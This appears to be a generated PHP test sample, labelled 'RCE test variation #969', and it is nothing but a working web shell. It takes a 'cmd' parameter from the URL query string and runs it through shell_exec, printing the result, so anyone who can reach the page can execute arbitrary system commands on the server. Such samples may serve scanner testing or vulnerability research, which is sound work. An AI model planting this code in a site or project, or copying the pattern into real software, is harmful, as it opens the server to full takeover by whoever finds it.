<?php
// RCE test variation #969
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>